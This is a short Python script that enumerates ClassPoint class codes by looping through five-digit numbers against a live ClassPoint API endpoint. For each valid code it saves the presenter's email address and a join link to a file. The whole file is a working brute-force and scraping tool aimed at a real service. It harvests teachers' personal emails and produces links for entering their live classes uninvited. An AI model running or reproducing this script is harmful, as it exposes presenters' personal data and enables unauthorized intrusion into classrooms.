import os
import sys
import time
import requests

from src.args import *

os.chdir(os.path.dirname(os.path.abspath(__file__)))
starttime = time.strftime("%d-%m-%y_%H:%M:%S")

if not os.path.isdir("links"):
    os.mkdir("links")

if len(sys.argv) > 1:
    parse_args(sys.argv[1:])

print("\033c")
print_version("\nSearching...\n")

# create the file in write mode
with open(f"links/links_{starttime}.txt", "w") as f:
    f.write("")

code = 10200

while code < 99999:
    data = requests.get(f"https://apitwo.classpoint.app/classcode/region/byclasscode?classcode={code}")
    if data.status_code != 200:
        code += 1
        continue

    resData = data.json()

    with open(f"links/links_{starttime}.txt", "a") as f:
        f.write(f"Email: {resData['presenterEmail']}\nhttps://www.classpoint.app/?code={code}\n\n")

    print("Class code found: " + str(code))
    print("Link saved.\n")

    code += 1

print("Search completed. Links saved to links/links_" + starttime + ".txt\n")
